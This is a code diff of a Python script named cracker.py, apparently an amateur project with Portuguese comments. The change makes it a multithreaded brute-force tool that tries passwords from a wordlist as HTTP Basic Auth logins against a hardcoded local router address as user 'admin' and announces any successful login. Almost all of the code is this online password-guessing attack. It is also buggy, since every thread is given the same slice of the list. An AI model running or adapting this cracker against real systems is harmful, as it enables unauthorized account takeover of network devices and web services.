@@ -26,6 +26,7 @@ SOFTWARE.
 import requests
 import sys
 import argparse
+import threading
 
 __author__ = "Luiz Guilherme Fritsch"
 __copyright__ = "Copyright (c) 2019 Luiz Fritsch"
@@ -36,7 +37,7 @@ __maintainer__ = "Luiz Fritsch"
 __email__ = "fritsch.guilherm3@gmail.com"
 __GITHUB__  =   "https://github.com/luizfritsch"
 
-
+CRACKED_PASSWORD = None
 
 def usage():
 	print ("Usage: python cracker.py -t [TARGETs IP] -u [USER TO TEST] -p [PATH TO passwordlist]")
@@ -49,60 +50,99 @@ def divisores(num):
            yield i
     yield num
 
-def bruteforce(passwordlist):
-	#Le o arquivo de senha
-	fd = open(passwordlist, 'r')
+def bruteforce(target, passwords, username):
+	try:
+		i = 0
+		print ("OI")
+		for password in passwords:
+			i = i + 1
+			password = str(password.rstrip())
+			test = requests.get('http://'+target, auth=(username, password))
+			code = test.status_code
+			print  ('[',i,']         USER[',username,']          PASS [',password,']')
+			if code == 200:
+				print ()
+				print ("==========================[LOGIN FOUNDED]==========================")
+				print ()
+				print ("===================================================================")
+				print ("                 [  :: USER[",username,"] AND PASS[",password,"]  ]")
+				print ("===================================================================")
+				print ()
+				print ()
+				global CRACKED_PASSWORD
+				CRACKED_PASSWORD = password
+				print ()
+				print ()
+			else:
+				pass	
+
+	except Exception as e:
+		print (e)
 	
-	#Salva numa lista
-	passwords = fd.readlines()
 
-	#Pega a quantidade de elementos que tem na lista de senhas
-	qtdElementosNaLista = len(passwords)
 
-	print ()
-	print ("==========================[Começando]==========================")
-	print ()
+#Le o arquivo de senha
+fd = open('pwd-list.txt', 'r')
 	
-	#Acha os divisores
-	divisor = list(divisores(qtdElementosNaLista))
+#Salva numa lista
+passwords = fd.readlines()
+
+#Pega a quantidade de elementos que tem na lista de senhas
+qtdElementosNaLista = len(passwords)
+
+print ()
+print ("==========================[Começando]==========================")
+print ()
 	
-	#Acha o maior divisor, que nao seja ele mesmo
-	md = 0
-
-	if divisor[-1] == len(passwords):
-		try:
-			md = divisor[-2]	
-		except Exception as e:
-			print (e)
-			print ("...")
-			print ("	...")
-			print ("		...")
-			print ("	...")
-			print ("...")
-			print ("Exiting")
-			sys.exit(0)
-	else:
-		md = divisor[-1]
-
-	print ()
-	print ("==========================[Dividindo e conquistando]==========================")
-	print ()
-
-	#Separa a lista em n listas, onde n = maior divisor
-	print (md)
-	splited = [passwords[i::md] for i in range(md)]
-
-	nmrThreads = 4
-
-	#Preciso agora dividir em uma quantidade exata de arrays pra cada Thread	
+#Acha os divisores
+divisor = list(divisores(qtdElementosNaLista))
+	
+#Acha o maior divisor, que nao seja ele mesmo
+md = 0
 
 
+qtdThreads = int(input("Quantas threads deseja criar?"))
 
 
+if divisor[-1] == len(passwords):
+	try:
+		md = divisor[-2]	
+	except Exception as e:
+		print (e)
+		print ("...")
+		print ("	...")
+		print ("		...")
+		print ("	...")
+		print ("...")
+		print ("Exiting")
+		sys.exit(0)
+else:
+	md = divisor[-1]
 
-	#print (splited)
-	'''
-	print (str(splited[0][0]))
-	'''
+print ()
+print ("==========================[Dividindo e conquistando]==========================")
+print ()
 
-bruteforce('pwd-list.txt')
+#Separa a lista em n listas, onde n = maior divisor
+#print (md)
+splited = [passwords[i::md] for i in range(md)]
+
+qtd = int(int(qtdElementosNaLista)/qtdThreads)
+
+#Preciso agora dividir em uma quantidade exata de arrays pra cada Thread	
+
+separador = 0
+threads = []
+for i in range(1,qtdThreads):
+	arrays = passwords[separador:qtd]
+	locals()['thread%d' % i] = threading.Thread(target=bruteforce,args=['192.168.0.1', arrays, "admin"])
+
+for i in range(1,qtdThreads):
+	locals()['thread%d' % i].start()
+	threads.append(locals()['thread%d' % i])
+
+
+for t in threads:
+    t.join()
+ 
+print ("Saindo da main")
